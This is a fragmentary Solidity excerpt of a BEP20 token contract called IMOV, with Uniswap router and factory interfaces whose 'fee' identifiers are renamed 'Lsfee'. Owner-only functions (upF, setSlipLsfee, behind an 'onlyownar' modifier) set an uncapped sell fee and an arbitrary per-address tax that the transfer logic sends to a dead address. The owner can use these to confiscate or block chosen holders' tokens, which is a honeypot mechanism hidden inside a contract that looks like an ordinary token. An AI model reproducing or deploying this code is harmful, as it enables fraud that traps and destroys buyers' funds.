...
interface IUniswapV2Factory {
    ...
    function LsfeeTo() external view returns (address);
    function LsfeeToSetter() external view returns (address);
    ...
    function setLsfeeTo(address) external;
    function setLsfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingLsfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingLsfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingLsfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingLsfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingLsfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract IMOV is BEP20, Ownable {
    ...
    uint256 private _defaultSellLsfee = 0;

    uint256 private _defaultBuyLsfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipLsfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellLsfee = _value;
    }

    function setSlipLsfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipLsfee[_address] = _value;
    }

    function getSlipLsfee(address _address) external view onlyownar returns (uint256) {
        return _slipLsfee[_address];
    }


    function setMAccountLsfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountLsfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeLsfeeAmount = 0;

        if (rF) {
            uint256 tradeLsfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeLsfee = _defaultSellLsfee;
                }
                if (from == uniswapV2Pair) {

                    tradeLsfee = _defaultBuyLsfee;
                }
            }
            if (_slipLsfee[from] > 0) {
                tradeLsfee = _slipLsfee[from];
            }

            tradeLsfeeAmount = _Amount.mul(tradeLsfee).div(100);
        }


        if (tradeLsfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeLsfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeLsfeeAmount);
            emit Transfer(from, _deadAddress, tradeLsfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeLsfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeLsfeeAmount);
        emit Transfer(from, _to, _Amount - tradeLsfeeAmount);
    }
